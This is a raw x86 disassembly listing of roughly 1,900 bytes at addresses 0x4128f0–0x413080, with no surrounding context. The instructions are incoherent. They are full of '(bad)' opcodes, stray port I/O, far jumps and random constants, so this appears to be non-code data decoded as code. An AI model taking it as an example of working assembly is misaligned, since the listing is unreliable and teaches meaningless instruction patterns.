  4128f0:	and    bl,BYTE PTR [ebx+esi*4-0x5578a140]
  4128f7:	lea    esp,[ebx+0x59]
  4128fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128fb:	xchg   ebx,eax
  4128fc:	sub    BYTE PTR [edx-0x46],bl
  4128ff:	test   eax,0x61860f6a
  412904:	xor    BYTE PTR [edi],ah
  412906:	repz arpl WORD PTR [esi-0x79],bx
  41290a:	mov    BYTE PTR [eax+0x11],ah
  41290d:	mov    ds:0x40fbc87e,eax
  412912:	es jno 0x412976
  412915:	or     ebp,DWORD PTR [ecx+0x3b]
  412918:	pop    esi
  412919:	jle    0x41294d
  41291b:	mov    edx,DWORD PTR [ebp-0x39d15905]
  412921:	and    BYTE PTR cs:[ecx-0x78613b3f],0x77
  412929:	mov    ebp,0xbfeb91b9
  41292e:	out    dx,al
  41292f:	scas   eax,DWORD PTR es:[edi]
  412930:	or     esi,DWORD PTR [esi]
  412932:	outs   dx,DWORD PTR ds:[esi]
  412933:	push   esi
  412934:	daa    
  412935:	retf   
  412936:	or     DWORD PTR [ecx-0x2010f55e],esp
  41293c:	mov    ecx,DWORD PTR [ebp+0x155bbb31]
  412942:	jl     0x41292d
  412944:	(bad)  
  412945:	loopne 0x4128d5
  412947:	adc    eax,0xf8975097
  41294c:	xor    ah,BYTE PTR [ecx-0x7d]
  41294f:	xor    DWORD PTR [ecx+eax*2-0x44d01c4d],edi
  412956:	repnz or BYTE PTR [ebx+0x7f454df6],0x60
  41295e:	xchg   esi,esp
  412960:	jne    0x41299c
  412962:	ja     0x4129b0
  412964:	dec    ecx
  412965:	sbb    cl,ch
  412967:	pop    es
  412968:	lods   eax,DWORD PTR ds:[esi]
  412969:	test   eax,0x15de2fb3
  41296e:	dec    edx
  41296f:	jns    0x4129e8
  412971:	push   edx
  412972:	mov    ecx,0x4e24645f
  412977:	jecxz  0x412985
  412979:	dec    ebp
  41297a:	jp     0x412996
  41297c:	arpl   WORD PTR [esi],sp
  41297e:	mov    ch,0xc7
  412980:	xchg   esp,eax
  412981:	sbb    DWORD PTR [esi-0x1482a1d3],esp
  412987:	into   
  412988:	pop    eax
  412989:	push   edx
  41298a:	mov    dh,0xf5
  41298c:	mov    ebp,0x7df2ee42
  412991:	sbb    ebx,DWORD PTR [ecx-0x35aa13e]
  412997:	stos   DWORD PTR es:[edi],eax
  412998:	pusha  
  412999:	int    0xe2
  41299b:	jl     0x41297e
  41299d:	pusha  
  41299e:	outs   dx,BYTE PTR ds:[esi]
  41299f:	xor    al,0xb6
  4129a1:	pop    ss
  4129a2:	xlat   BYTE PTR ds:[ebx]
  4129a3:	data16 es jnp 0x412995
  4129a7:	mov    ecx,0x9de06e68
  4129ac:	push   0x64
  4129ae:	fisub  WORD PTR [eax-0x6e173d74]
  4129b4:	(bad)  
  4129b5:	retf   
  4129b6:	cli    
  4129b7:	jg     0x412a17
  4129b9:	enter  0xe204,0xae
  4129bd:	or     esp,edi
  4129bf:	push   esp
  4129c0:	out    0x60,eax
  4129c2:	sub    DWORD PTR [esi],ecx
  4129c4:	in     eax,0x70
  4129c6:	adc    ch,BYTE PTR [eax]
  4129c8:	neg    al
  4129ca:	out    dx,al
  4129cb:	mov    bl,0x9a
  4129cd:	mov    eax,ds:0x4277d0b6
  4129d2:	icebp  
  4129d3:	mov    eax,ds:0x237bf17a
  4129d8:	push   0xffffff98
  4129da:	lea    esp,[ecx+0x40]
  4129dd:	push   ebp
  4129de:	out    dx,eax
  4129df:	outs   dx,DWORD PTR ds:[esi]
  4129e0:	and    al,0xa9
  4129e2:	cdq    
  4129e3:	popa   
  4129e4:	cmc    
  4129e5:	jge    0x4129ee
  4129e7:	dec    edx
  4129e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129e9:	pusha  
  4129ea:	test   al,0x85
  4129ec:	dec    esp
  4129ed:	lahf   
  4129ee:	mov    ecx,0xedbf3de2
  4129f3:	mov    eax,ds
  4129f5:	add    esi,DWORD PTR [edi+edi*1+0x7b]
  4129f9:	inc    ebx
  4129fa:	data16 sub dl,BYTE PTR [eax]
  4129fd:	popa   
  4129fe:	lds    esp,FWORD PTR [eax]
  412a00:	mov    ds:0xadd9c381,al
  412a05:	nop
  412a06:	push   esp
  412a07:	or     bl,BYTE PTR [esi-0x77]
  412a0a:	inc    esp
  412a0b:	jle    0x412a05
  412a0d:	outs   dx,BYTE PTR ds:[esi]
  412a0e:	sub    BYTE PTR [eax-0x3a],al
  412a11:	pusha  
  412a12:	mov    bl,0x26
  412a14:	jbe    0x412996
  412a16:	fisttp WORD PTR [edx]
  412a18:	ss aam 0xee
  412a1b:	adc    bl,BYTE PTR [eax-0x46]
  412a1e:	out    0x7e,eax
  412a20:	adc    BYTE PTR [esi+0x5ccfd988],0x23
  412a27:	fcomp  QWORD PTR [esi+0x45]
  412a2a:	fs inc esp
  412a2c:	push   ss
  412a2d:	push   cs
  412a2e:	sahf   
  412a2f:	cmp    ebx,DWORD PTR [esi+0x4a]
  412a32:	jmp    FWORD PTR [ebx-0x6f]
  412a35:	outs   dx,BYTE PTR ds:[esi]
  412a36:	pop    es
  412a37:	cli    
  412a38:	(bad)  
  412a39:	and    bl,BYTE PTR [edx-0x2f189e5f]
  412a3f:	xchg   ecx,esp
  412a41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a42:	or     al,0x61
  412a44:	inc    edx
  412a45:	imul   ecx,DWORD PTR [edx-0x64],0x5e
  412a49:	mov    ecx,0xaa5a2bb7
  412a4e:	fwait
  412a4f:	lea    edx,[eax]
  412a51:	loop   0x412a4b
  412a53:	and    BYTE PTR [eax-0x67],ah
  412a56:	dec    ecx
  412a57:	cmp    DWORD PTR [edx],eax
  412a59:	and    ebp,esi
  412a5b:	in     eax,dx
  412a5c:	or     ch,ah
  412a5e:	cmp    eax,0x54cc4a6c
  412a63:	mov    eax,ds:0x28d5fbee
  412a68:	cmp    al,BYTE PTR [eax+eax*8+0x16695f11]
  412a6f:	fs pusha 
  412a71:	jp     0x412a07
  412a73:	inc    eax
  412a74:	xlat   BYTE PTR ds:[ebx]
  412a76:	call   FWORD PTR [ebx+0x4f]
  412a79:	popa   
  412a7a:	int3   
  412a7b:	mov    bl,0x31
  412a7d:	lea    esi,[ecx]
  412a7f:	push   esp
  412a80:	add    ecx,DWORD PTR [edi-0x13]
  412a83:	mov    dl,0xd7
  412a85:	fnstcw WORD PTR [ecx-0x60]
  412a88:	shl    DWORD PTR [ebp+0x14ae2246],cl
  412a8e:	int3   
  412a8f:	mov    bh,0x5e
  412a91:	sbb    DWORD PTR [edi-0x1b8906fb],edx
  412a97:	cdq    
  412a98:	pop    ebx
  412a99:	out    0x2d,eax
  412a9b:	addr16 inc ecx
  412a9d:	jge    0x412acd
  412a9f:	mov    bl,0x7b
  412aa1:	sub    BYTE PTR [edi-0x5f],cl
  412aa4:	xor    DWORD PTR [edx],0xbb01649c
  412aaa:	jne    0x412abb
  412aac:	adc    edi,DWORD PTR [esi+ebx*4-0x4a]
  412ab0:	lds    esp,FWORD PTR [eax-0x73]
  412ab3:	push   esp
  412ab4:	and    BYTE PTR [eax+0x19],dh
  412ab7:	rol    DWORD PTR [edx+0x13],1
  412aba:	out    dx,al
  412abb:	jmp    0xccd0649
  412ac0:	dec    ebp
  412ac1:	(bad)  [esi+0x473f91bc]
  412ac7:	nop
  412ac8:	add    BYTE PTR [esi-0x4c983f82],bl
  412ace:	ds jecxz 0x412b3e
  412ad1:	retf   
  412ad2:	jmp    0x412ab9
  412ad4:	cmc    
  412ad5:	addr16 push ss
  412ad7:	jo     0x412ade
  412ad9:	popa   
  412ada:	push   ds
  412adb:	retf   
  412adc:	stos   DWORD PTR es:[edi],eax
  412add:	(bad)  
  412ade:	inc    eax
  412ae0:	iret   
  412ae1:	sub    ebx,esp
  412ae3:	jle    0x412b44
  412ae5:	sbb    ebp,DWORD PTR [ecx-0x1a5dc0a0]
  412aeb:	pusha  
  412aec:	into   
  412aed:	jb     0x412ae1
  412aef:	mov    al,ds:0xe8fd7bfa
  412af4:	outs   dx,BYTE PTR ds:[esi]
  412af5:	add    dh,BYTE PTR [eax-0x43]
  412af8:	fs jp  0x412aba
  412afb:	mov    dh,0x8e
  412afd:	and    BYTE PTR [esi-0xf8ad83],al
  412b03:	mov    cl,0x30
  412b05:	lahf   
  412b06:	add    BYTE PTR [ebp-0x3f],dh
  412b09:	xchg   esp,eax
  412b0a:	push   ds
  412b0b:	js     0x412b68
  412b0d:	(bad)  [ebp-0x62e7b7e2]
  412b13:	sbb    cl,BYTE PTR [edx+0x220d3ab9]
  412b19:	in     ax,0x86
  412b1c:	fmulp  st(3),st
  412b1e:	mov    al,0x80
  412b20:	pushf  
  412b21:	xor    BYTE PTR [esi],bh
  412b23:	cmp    al,0x5e
  412b25:	sahf   
  412b26:	dec    ebp
  412b27:	mov    BYTE PTR [edx],bl
  412b29:	pop    es
  412b2a:	into   
  412b2b:	dec    ebp
  412b2c:	cmc    
  412b2d:	pusha  
  412b2e:	adc    BYTE PTR [ebx-0x55],bh
  412b31:	das    
  412b32:	dec    eax
  412b33:	jmp    0x412b71
  412b35:	sbb    al,0xee
  412b37:	mov    ch,0xf4
  412b39:	mov    esi,0x68a838a7
  412b3e:	push   es
  412b3f:	mov    ds:0x492e1210,al
  412b44:	fwait
  412b45:	mov    eax,0xeeb3c3f0
  412b4b:	lods   eax,DWORD PTR ds:[esi]
  412b4c:	dec    eax
  412b4d:	sub    eax,0xec22b8ab
  412b52:	cmp    BYTE PTR [ecx-0x34ab92a],ah
  412b58:	fistp  DWORD PTR [ebx]
  412b5a:	dec    edi
  412b5b:	or     BYTE PTR [ebx+0x7c],ah
  412b5e:	push   eax
  412b5f:	stos   DWORD PTR es:[edi],eax
  412b60:	shl    BYTE PTR [eax+0x5b],cl
  412b63:	add    edi,DWORD PTR [ecx-0x22]
  412b66:	cmp    eax,0x46a336a1
  412b6b:	retf   0xd62e
  412b6e:	(bad)  
  412b6f:	xlat   BYTE PTR ds:[ebx]
  412b70:	pop    esi
  412b71:	dec    ecx
  412b72:	dec    esi
  412b73:	ret    
  412b74:	jecxz  0x412b60
  412b76:	repnz or ebx,DWORD PTR [ecx+0x22910360]
  412b7d:	loop   0x412b9f
  412b7f:	mov    edx,0x21772304
  412b84:	ret    
  412b85:	into   
  412b86:	pop    edi
  412b87:	push   eax
  412b88:	jnp    0x412bea
  412b8a:	inc    ebx
  412b8b:	outs   dx,DWORD PTR cs:[esi]
  412b8d:	jmp    0xaee7:0x7638b0e8
  412b94:	je     0x412b30
  412b96:	or     DWORD PTR [ecx],esi
  412b98:	outs   dx,BYTE PTR ds:[esi]
  412b99:	push   eax
  412b9a:	out    0xe2,eax
  412b9c:	push   ss
  412b9d:	pop    esp
  412b9e:	inc    ebx
  412b9f:	scas   al,BYTE PTR es:[edi]
  412ba0:	mov    ds:0x9e2b915b,al
  412ba5:	push   esi
  412ba6:	jns    0x412bba
  412ba8:	sbb    al,0x61
  412baa:	mov    esi,0x23bc8c97
  412baf:	push   esi
  412bb0:	ins    BYTE PTR es:[edi],dx
  412bb1:	lock out dx,al
  412bb3:	outs   dx,DWORD PTR ds:[esi]
  412bb4:	jne    0x412c25
  412bb6:	stos   BYTE PTR es:[edi],al
  412bb7:	inc    edi
  412bb8:	dec    eax
  412bb9:	mov    esi,0x3163901c
  412bbe:	repz mov esi,0xc021612c
  412bc4:	out    0x96,eax
  412bc6:	add    eax,0x530c5ebf
  412bcb:	cmp    al,0x5
  412bcd:	sbb    eax,0x6106f5df
  412bd2:	xlat   BYTE PTR ds:[ebx]
  412bd3:	ficom  DWORD PTR [eax+0x3b]
  412bd6:	mov    ch,0xee
  412bd8:	push   ebx
  412bd9:	xchg   ecx,eax
  412bda:	out    dx,al
  412bdb:	dec    ecx
  412bdc:	pop    edi
  412bdd:	clc    
  412bde:	ror    BYTE PTR [ebx-0x5ee58ef7],1
  412be4:	aaa    
  412be5:	push   edi
  412be6:	and    BYTE PTR [eax+0x1b],ch
  412be9:	ds loopne 0x412c07
  412bec:	push   edi
  412bed:	test   bh,dh
  412bef:	ins    DWORD PTR es:[edi],dx
  412bf0:	ret    0xb8e8
  412bf3:	inc    ebx
  412bf4:	mov    BYTE PTR [ecx-0x16],bl
  412bf7:	mov    ecx,0x81918ee1
  412bfc:	scas   al,BYTE PTR es:[edi]
  412bfd:	adc    edx,eax
  412bff:	add    eax,0xa697625e
  412c04:	mov    eax,ds:0xbe232be2
  412c09:	mov    esp,0xa8c4a123
  412c0e:	add    eax,ecx
  412c10:	add    al,0x8d
  412c12:	fbld   TBYTE PTR [bp+di+0x14]
  412c16:	(bad)  
  412c17:	xchg   esi,eax
  412c18:	mov    bh,0xc0
  412c1a:	popf   
  412c1b:	mov    eax,0x78ab064a
  412c20:	aad    0x60
  412c22:	popa   
  412c23:	dec    esi
  412c24:	data16 jmp 0x412c1a
  412c27:	sbb    DWORD PTR [ecx+edx*1],esi
  412c2a:	jmp    0x412c18
  412c2c:	ds inc edi
  412c2e:	push   ebx
  412c2f:	pop    esi
  412c30:	mov    ebp,0xab9ed7a0
  412c35:	push   ecx
  412c36:	(bad)  
  412c37:	or     eax,0xc76efa33
  412c3c:	out    dx,al
  412c3d:	outs   dx,BYTE PTR ds:[esi]
  412c3e:	fdivr  QWORD PTR [edx+esi*1+0x538e4621]
  412c45:	lea    ebp,[esi+0x4]
  412c48:	mov    DWORD PTR [ebx+0x6b],ebx
  412c4b:	pop    esi
  412c4c:	mov    ebx,0x5ed18661
  412c51:	ror    DWORD PTR [ebp+0x2c],cl
  412c54:	loopne 0x412cb4
  412c56:	fmul   DWORD PTR ds:0xa0c7c526
  412c5c:	bound  ebx,QWORD PTR [eax+0x21]
  412c5f:	mov    dl,0x3
  412c61:	stos   DWORD PTR es:[edi],eax
  412c62:	ret    
  412c63:	mov    eax,ds:0xd0148b51
  412c68:	sbb    BYTE PTR [ecx],al
  412c6a:	mov    eax,0xbbee8655
  412c70:	xchg   esp,eax
  412c71:	dec    ebp
  412c72:	mov    eax,ds:0xbe70ad47
  412c77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c78:	fstp   DWORD PTR [esi]
  412c7a:	xor    DWORD PTR [eax+ebp*1],0x6bae7cf1
  412c81:	test   DWORD PTR [esi+0x16],edi
  412c84:	pop    esi
  412c85:	test   DWORD PTR [ebp-0x1f],ebp
  412c88:	jmp    0x8bcb7c45
  412c8d:	pusha  
  412c8e:	mov    dl,0x3d
  412c90:	add    cl,al
  412c92:	and    bl,BYTE PTR [edx]
  412c94:	mov    bh,0xb
  412c96:	xrelease mov DWORD PTR cs:[esi+0x6102025a],0x95d422d
  412ca2:	inc    esi
  412ca3:	pop    ss
  412ca4:	sub    BYTE PTR [ebp-0x3eb68ea1],bl
  412caa:	ja     0x412c8d
  412cac:	dec    eax
  412cad:	mov    dl,0xa7
  412cb0:	jl     0x412c7f
  412cb2:	outs   dx,DWORD PTR ds:[esi]
  412cb3:	xchg   ecx,eax
  412cb4:	add    dl,BYTE PTR [ecx]
  412cb6:	pop    ss
  412cb7:	loop   0x412c9b
  412cb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412cba:	out    dx,al
  412cbb:	dec    edi
  412cbc:	push   esp
  412cbd:	sub    eax,0x519e6403
  412cc2:	jo     0x412c65
  412cc4:	mov    esp,ebp
  412cc6:	sub    eax,0x3a77c6fd
  412ccb:	sbb    DWORD PTR [esi+0x19],0xffffff94
  412ccf:	inc    ebx
  412cd0:	mov    ah,0x2e
  412cd2:	das    
  412cd3:	xchg   BYTE PTR [edi+0x4f],dl
  412cd6:	in     al,0x71
  412cd8:	mov    esi,0x655b5057
  412cdd:	cld    
  412cde:	lock repz fstp TBYTE PTR [edx-0x7f775e48]
  412ce6:	jns    0x412d41
  412ce8:	jmp    0xa684:0x8577d9c6
  412cef:	jns    0x412d54
  412cf1:	xor    ebx,DWORD PTR [edx-0x1f]
  412cf4:	retf   0x29a0
  412cf7:	das    
  412cf8:	dec    ebp
  412cf9:	inc    esp
  412cfa:	inc    eax
  412cfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412cfc:	adc    DWORD PTR [esi+0x75],0xb2e0ae33
  412d03:	mov    ecx,?
  412d05:	test   al,0xee
  412d07:	out    dx,eax
  412d08:	clc    
  412d09:	inc    edi
  412d0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d0b:	enter  0xc31e,0x8a
  412d0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d10:	sahf   
  412d11:	xchg   esi,eax
  412d12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d14:	sub    DWORD PTR [ebx],esi
  412d16:	in     eax,dx
  412d17:	adc    al,bl
  412d19:	int3   
  412d1a:	pop    eax
  412d1b:	mov    ebp,0xfbce4f8d
  412d20:	pop    eax
  412d21:	popa   
  412d22:	into   
  412d23:	mov    BYTE PTR [eax+0x28],dh
  412d26:	mov    dh,0x57
  412d28:	cmp    eax,0xdb78eeb8
  412d2d:	pop    esi
  412d2e:	gs cmp eax,0xa0d5d733
  412d34:	test   DWORD PTR [edx+0x1952f79d],0xb5e9bd4
  412d3e:	inc    edi
  412d3f:	inc    edx
  412d40:	(bad)  
  412d41:	mov    ebp,0x613149e4
  412d46:	jp     0x412ce2
  412d48:	sub    BYTE PTR [edi],cl
  412d4a:	jns    0x412d1d
  412d4c:	sub    DWORD PTR [edi-0x12],esi
  412d4f:	xor    bl,BYTE PTR [ebx+0x68]
  412d52:	stc    
  412d53:	dec    edi
  412d54:	pop    esp
  412d55:	outs   dx,DWORD PTR ds:[esi]
  412d56:	xor    ah,BYTE PTR [edx+0x2fffe61]
  412d5c:	mov    WORD PTR [ebp-0x17],?
  412d5f:	pusha  
  412d60:	es adc al,0xee
  412d63:	int3   
  412d64:	mov    al,ds:0xa17d77d5
  412d69:	cdq    
  412d6a:	test   BYTE PTR [ebp+0x1a44a38e],bl
  412d70:	dec    esi
  412d71:	dec    ebx
  412d72:	out    dx,al
  412d73:	pop    edx
  412d74:	js     0x412d29
  412d76:	jo     0x412d50
  412d78:	and    dl,dl
  412d7a:	pop    ebp
  412d7b:	mov    eax,ds:0x18694df0
  412d80:	xor    BYTE PTR [esi-0x7bb3c34a],ah
  412d86:	cld    
  412d87:	adc    eax,0xbc757e5e
  412d8c:	or     eax,0x6ea11f9d
  412d91:	sbb    DWORD PTR [ecx-0x35c4bca2],ebx
  412d97:	jne    0x412df7
  412d99:	repz scas eax,DWORD PTR es:[edi]
  412d9b:	push   ecx
  412d9c:	imul   edi,DWORD PTR [ecx-0x9],0xb
  412da0:	fisub  DWORD PTR [eax+0x23]
  412da3:	dec    esi
  412da4:	dec    esp
  412da5:	clc    
  412da6:	mov    al,ds:0xeebbff0f
  412dab:	mov    esp,0xe0c5c7e9
  412db0:	sahf   
  412db1:	mov    bl,0xbb
  412db3:	mov    al,ds:0x189db766
  412db8:	imul   edi,DWORD PTR [eax],0x52
  412dbb:	push   esi
  412dbc:	pop    esi
  412dbd:	xor    al,0x83
  412dbf:	in     al,dx
  412dc0:	(bad)  
  412dc1:	in     al,0x9a
  412dc3:	shl    DWORD PTR [eax+0x61],cl
  412dc6:	cdq    
  412dc7:	adc    eax,0xe5b754d6
  412dcc:	jl     0x412dc1
  412dce:	out    dx,al
  412dcf:	retf   0xfeef
  412dd2:	mov    ch,0xb8
  412dd4:	adc    al,0xb6
  412dd6:	pop    eax
  412dd7:	mov    eax,ds:0x2bad7ed1
  412ddc:	out    0x84,eax
  412dde:	xor    BYTE PTR [ebp+ebx*2+0x15],ah
  412de2:	jmp    0x412de0
  412de4:	mov    esi,0x2ec90990
  412de9:	pop    ebp
  412dea:	and    ah,BYTE PTR [ecx+0x46a074d3]
  412df0:	push   0xffffff88
  412df2:	and    al,0x29
  412df4:	pop    ebx
  412df5:	cs jle 0x412e5f
  412df8:	mov    ecx,DWORD PTR [ebp+0x69]
  412dfb:	clc    
  412dfc:	fisub  WORD PTR [ebp+eax*2-0x449ee5be]
  412e03:	mov    ebx,ebp
  412e05:	jg     0x412e03
  412e07:	inc    edx
  412e08:	adc    eax,0x8f24eeb6
  412e0d:	mov    ebx,0x169dc833
  412e12:	dec    esp
  412e13:	mov    eax,ds:0x80e2eb5f
  412e18:	leave  
  412e19:	xchg   ecx,eax
  412e1a:	push   edi
  412e1b:	fisub  WORD PTR [ebp+edx*8-0x6f]
  412e1f:	sti    
  412e20:	adc    eax,0x3a305d41
  412e25:	adc    dl,al
  412e27:	lea    esp,[edx+eax*4-0x5d]
  412e2b:	call   0x445e:0x58f03137
  412e32:	inc    ecx
  412e33:	les    ebp,FWORD PTR ds:0x2127eedc
  412e39:	rol    BYTE PTR [edx],0x8
  412e3c:	mov    dh,ch
  412e3e:	sbb    al,0xa1
  412e40:	sub    al,0x58
  412e42:	xor    BYTE PTR [eax+0x31],dh
  412e45:	or     cl,BYTE PTR [ecx+0x176d5bcb]
  412e4b:	jmp    0xd4800e87
  412e50:	jne    0x412e57
  412e52:	xchg   esp,eax
  412e53:	mov    eax,ds:0x3a55d84
  412e58:	and    BYTE PTR [ebx+0x7a],cl
  412e5b:	add    DWORD PTR [esi+0x43],edx
  412e5e:	adc    ebp,DWORD PTR [ecx-0x5dc975b0]
  412e64:	shl    BYTE PTR [edx-0x16],0xcd
  412e68:	dec    DWORD PTR [esi]
  412e6a:	xchg   edi,eax
  412e6b:	adc    eax,0x71ebee32
  412e71:	xchg   ebp,eax
  412e72:	mov    bl,0xe8
  412e74:	repnz mov ebx,0xe81da15e
  412e7a:	mov    ebp,0x708026b4
  412e7f:	ds pop esi
  412e81:	cmc    
  412e82:	dec    edi
  412e83:	lds    esi,FWORD PTR cs:0x520af874
  412e8a:	retf   
  412e8b:	jae    0x412eae
  412e8d:	mov    BYTE PTR [esi+0xc724605],cl
  412e93:	push   edi
  412e94:	dec    ebx
  412e95:	sahf   
  412e96:	adc    eax,0x41875eb8
  412e9b:	sbb    edx,DWORD PTR [esi+0x71]
  412e9e:	push   edx
  412e9f:	mov    eax,ds:0xa6a5df36
  412ea4:	inc    esp
  412ea5:	and    al,0x71
  412ea7:	cmp    eax,0xa75de263
  412eac:	push   0x40
  412eae:	loopne 0x412e43
  412eb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412eb1:	mov    cs,ebp
  412eb3:	(bad)  
  412eb4:	test   eax,0xb6a10c17
  412eb9:	add    esp,DWORD PTR [esi]
  412ebb:	ror    DWORD PTR [edi],0x84
  412ebe:	out    dx,al
  412ebf:	cmp    eax,0xe7bf9db1
  412ec4:	scas   al,BYTE PTR es:[edi]
  412ec5:	sbb    bl,BYTE PTR [eax-0x5f]
  412ec8:	sub    bl,dl
  412eca:	sub    al,0xe
  412ecc:	add    ch,BYTE PTR [eax+0x3d]
  412ecf:	cmp    bl,BYTE PTR [ecx-0x50]
  412ed2:	ins    BYTE PTR es:[edi],dx
  412ed3:	mov    esi,0xc76e2b18
  412ed8:	or     DWORD PTR [ebx+0x39],esi
  412edb:	mov    eax,ds:0x156f099f
  412ee0:	test   edi,eax
  412ee2:	and    eax,0x29d75ba7
  412ee7:	call   DWORD PTR [esi+eax*1]
  412eea:	sub    eax,0x1ed15660
  412eef:	sub    eax,0x93925e5f
  412ef4:	aad    0x86
  412ef6:	mov    BYTE PTR [edx-0x3a],dl
  412ef9:	fld    TBYTE PTR [esi+0x46805ef2]
  412eff:	(bad)  
  412f00:	neg    BYTE PTR [eax+0x60b81968]
  412f06:	add    ebx,DWORD PTR ds:0x40f07e79
  412f0c:	add    DWORD PTR ds:0xe55666ee,eax
  412f12:	inc    eax
  412f13:	popf   
  412f14:	or     eax,edx
  412f16:	sub    esp,DWORD PTR [ecx+0x5804fc57]
  412f1c:	xor    eax,0x5eb2d4c3
  412f21:	ins    DWORD PTR es:[edi],dx
  412f22:	int    0x59
  412f24:	push   DWORD PTR [ecx+0x6129a396]
  412f2a:	add    bh,BYTE PTR [edi+0x4a]
  412f2d:	sub    edx,DWORD PTR [edi]
  412f2f:	xor    DWORD PTR [eax+ecx*4-0x12],ebp
  412f33:	and    ecx,edx
  412f35:	sbb    eax,0x3b0cec09
  412f3a:	retf   
  412f3b:	mov    al,ds:0x7f056cf1
  412f40:	aad    0x1a
  412f42:	jns    0x412ede
  412f44:	pop    esi
  412f45:	and    eax,0x942bc945
  412f4a:	mov    esi,?
  412f4c:	inc    esp
  412f4d:	popa   
  412f4e:	adc    DWORD PTR ds:0x2ba1b67f,edi
  412f54:	ss push ss
  412f56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f57:	gs pop esi
  412f59:	mov    dl,0x66
  412f5b:	jo     0x412ee2
  412f5d:	pop    ebp
  412f5e:	(bad)  
  412f5f:	ror    BYTE PTR [ebx+0x61],1
  412f62:	lahf   
  412f63:	test   BYTE PTR [esi-0xa],0x9b
  412f67:	and    edx,edi
  412f69:	inc    ebx
  412f6a:	(bad)  
  412f6c:	pop    edi
  412f6d:	test   al,0x4f
  412f6f:	mov    edx,?
  412f71:	adc    al,0x2d
  412f73:	imul   edi,DWORD PTR [eax-0x5b],0xbdf5a249
  412f7a:	test   eax,0x3b851d71
  412f7f:	jle    0x412f44
  412f81:	and    BYTE PTR [eax-0x7e],dh
  412f84:	ror    bl,cl
  412f86:	add    bh,BYTE PTR [ecx-0x24]
  412f89:	scas   al,BYTE PTR es:[edi]
  412f8a:	outs   dx,BYTE PTR ds:[esi]
  412f8b:	(bad)  
  412f8c:	cmp    ah,BYTE PTR [eax]
  412f8e:	cwde   
  412f8f:	adc    ch,ah
  412f91:	pop    ebp
  412f92:	(bad)  
  412f93:	loopne 0x412f1f
  412f95:	jbe    0x412fd7
  412f97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f98:	(bad)  
  412f9a:	xchg   edi,eax
  412f9b:	jno    0x413019
  412f9d:	sbb    al,0xee
  412f9f:	jle    0x412f97
  412fa1:	loop   0x412f9f
  412fa3:	int    0xcc
  412fa5:	lods   al,BYTE PTR ds:[esi]
  412fa6:	leave  
  412fa7:	mov    al,ds:0xf70d49fd
  412fac:	xlat   BYTE PTR ds:[ebx]
  412fad:	jne    0x412fe9
  412faf:	gs pop esi
  412fb1:	xor    ah,cl
  412fb3:	push   cs
  412fb4:	stos   BYTE PTR es:[edi],al
  412fb5:	xor    al,0xd1
  412fb7:	jae    0x412f87
  412fb9:	pop    ecx
  412fba:	push   esp
  412fbb:	sub    BYTE PTR [ebx+edx*4+0x6a85273],dl
  412fc2:	or     al,0x4d
  412fc4:	or     BYTE PTR [ecx-0x78e88862],ch
  412fca:	push   edx
  412fcb:	or     ebx,DWORD PTR [esi-0x51]
  412fce:	in     al,dx
  412fcf:	sbb    ebx,ecx
  412fd1:	inc    edi
  412fd2:	outs   dx,DWORD PTR ds:[esi]
  412fd3:	adc    al,0x5e
  412fd5:	sbb    edi,DWORD PTR [edx]
  412fd7:	(bad)  [ecx-0x812fb10]
  412fdd:	push   ecx
  412fde:	dec    eax
  412fdf:	adc    ch,BYTE PTR [ebx]
  412fe1:	adc    al,0xae
  412fe3:	pop    ebp
  412fe4:	jmp    0x413063
  412fe6:	xchg   edi,eax
  412fe7:	bound  esp,QWORD PTR [eax+0x4b]
  412fea:	pop    ecx
  412feb:	jno    0x412f70
  412fed:	xchg   edx,eax
  412fee:	ja     0x412fd1
  412ff0:	and    bh,BYTE PTR [edi+0x60b57137]
  412ff6:	pop    esp
  412ff7:	push   cs
  412ff8:	lahf   
  412ff9:	add    al,BYTE PTR [esi-0x18a805ab]
  412fff:	inc    ebx
  413000:	xor    edi,esp
  413002:	push   esp
  413003:	addr16 xchg ebp,eax
  413005:	pop    edi
  413006:	cs fwait
  413008:	push   ss
  413009:	gs ds stos DWORD PTR es:[edi],eax
  41300c:	add    cl,al
  41300e:	in     eax,0xa0
  413010:	xchg   esi,eax
  413011:	(bad)  
  413012:	mov    ss,WORD PTR [edx-0x33575f87]
  413018:	pop    esi
  413019:	ins    BYTE PTR es:[edi],dx
  41301a:	pop    edx
  41301b:	sub    bh,al
  41301d:	cwde   
  41301e:	jle    0x41305d
  413020:	xchg   BYTE PTR [eax+0x9],ah
  413023:	pushf  
  413024:	rsqrtps xmm2,xmm0
  413027:	(bad)  
  413028:	mov    ecx,0xe88000be
  41302d:	pop    ebp
  41302e:	cs push es
  413030:	sti    
  413031:	dec    ebp
  413032:	mov    cl,0x78
  413034:	pushf  
  413035:	das    
  413036:	push   edi
  413037:	mov    eax,ds:0x279b6b1
  41303c:	cmp    BYTE PTR [edi],ah
  41303e:	(bad)  
  41303f:	jno    0x41309f
  413041:	cmp    BYTE PTR [ebx-0x41],0xe0
  413045:	jmp    0x61602c4c
  41304a:	jmp    0x7020b4f
  41304f:	pop    ecx
  413050:	mov    ds,WORD PTR [edx-0x7c986112]
  413056:	pop    ecx
  413057:	dec    ebp
  413058:	outs   dx,DWORD PTR ds:[esi]
  413059:	out    0x92,eax
  41305b:	pushf  
  41305c:	stos   BYTE PTR es:[edi],al
  41305d:	adc    esi,DWORD PTR [esi-0x37]
  413060:	pop    esi
  413061:	mov    edx,DWORD PTR fs:[ecx+0x3a]
  413065:	mov    ebp,0x36f9f1eb
  41306a:	imul   eax,ecx,0x4
  41306d:	add    dh,cl
  41306f:	pop    ebx
  413070:	sahf   
  413071:	push   esp
  413072:	sub    eax,0x3b4e6a1
  413077:	adc    DWORD PTR [esi],esi
  413079:	jne    0x412fff
  41307b:	cmp    ebx,DWORD PTR [esi-0x54]
  41307e:	mov    ah,0x73
  413080:	dec    esp
